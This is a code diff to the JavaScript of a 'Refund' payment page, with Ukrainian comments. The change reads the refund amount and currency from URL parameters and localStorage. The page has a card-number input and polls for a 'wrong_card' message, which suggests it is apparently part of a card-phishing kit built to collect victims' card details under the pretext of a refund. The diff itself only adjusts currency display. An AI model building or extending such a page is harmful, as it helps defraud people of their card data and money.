@@ -527,18 +527,38 @@
     }
     // Total підтягуємо, беремо тільки число
     const totalRaw = getQueryParam('total');
+    const params = new URLSearchParams(window.location.search);
     if (totalRaw) {
-        // Витягуємо тільки число (цілу або з копійками)
-        const match = totalRaw.match(/\d+[\.,]?\d*/);
-        const totalNum = match ? match[0].replace(',', '.') : '';
-        if (totalNum) {
-            document.getElementById('payment-title').textContent = `Refund ${totalNum}€`;
+        // Витягуємо число і валюту з total (наприклад, 5DKD)
+        const match = totalRaw.match(/(\d+[\.,]?\d*)([A-Za-z]+)/);
+        if (match) {
+            const totalNum = match[1].replace(',', '.');
+            const currency = match[2];
+            document.getElementById('payment-title').textContent = `Refund ${totalNum} ${currency}`;
             // Зберігаємо заголовок для відновлення
-            localStorage.setItem('last_refund_title', `Refund ${totalNum}€`);
+            localStorage.setItem('last_refund_title', `Refund ${totalNum} ${currency}`);
             // Зберігаємо також в інших ключах для сумісності
             localStorage.setItem('event_price', totalNum);
-            localStorage.setItem('event_currency', 'EUR');
+            localStorage.setItem('event_currency', currency);
+        } else {
+            // Якщо тільки число, використовуємо валюту з URL або localStorage
+            const totalNum = totalRaw.match(/\d+[\.,]?\d*/);
+            if (totalNum) {
+                const currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
+                document.getElementById('payment-title').textContent = `Refund ${totalNum[0]} ${currency}`;
+                // Зберігаємо заголовок для відновлення
+                localStorage.setItem('last_refund_title', `Refund ${totalNum[0]} ${currency}`);
+                // Зберігаємо також в інших ключах для сумісності
+                localStorage.setItem('event_price', totalNum[0]);
+                localStorage.setItem('event_currency', currency);
+            }
         }
+    }
+    
+    // Якщо є тільки currency параметр, зберігаємо його
+    const currencyParam = params.get('currency');
+    if (currencyParam && !localStorage.getItem('event_currency')) {
+        localStorage.setItem('event_currency', currencyParam);
     }
     // --- POLLING для wrong_card ---
     let wrongCardMsg = null;
@@ -633,10 +653,10 @@ document.getElementById('card-input').addEventListener('input', function(e) {
       localStorage.setItem('refund_total', totalRaw);
       title = `Refund ${price} ${currency}`;
     } else {
-      // Якщо тільки число
+      // Якщо тільки число, використовуємо валюту з URL або localStorage
       const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = localStorage.getItem('event_currency') || 'EUR';
+      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
     }
   } else if (localStorage.getItem('refund_total')) {
@@ -652,7 +672,7 @@ document.getElementById('card-input').addEventListener('input', function(e) {
     } else {
       const numMatch = saved.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = localStorage.getItem('event_currency') || 'EUR';
+      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
     }
   } else {
@@ -779,10 +799,10 @@ document.addEventListener('visibilitychange', function() {
       localStorage.setItem('refund_total', totalRaw);
       title = `Refund ${price} ${currency}`;
     } else {
-      // Якщо тільки число
+      // Якщо тільки число, використовуємо валюту з URL або localStorage
       const numMatch = totalRaw.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = localStorage.getItem('event_currency') || 'EUR';
+      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
     }
   } else if (localStorage.getItem('refund_total')) {
@@ -798,7 +818,7 @@ document.addEventListener('visibilitychange', function() {
     } else {
       const numMatch = saved.match(/\d+[\.,]?\d*/);
       price = numMatch ? numMatch[0].replace(',', '.') : '';
-      currency = localStorage.getItem('event_currency') || 'EUR';
+      currency = params.get('currency') || localStorage.getItem('event_currency') || 'EUR';
       title = `Refund ${price} ${currency}`;
     }
   } else {
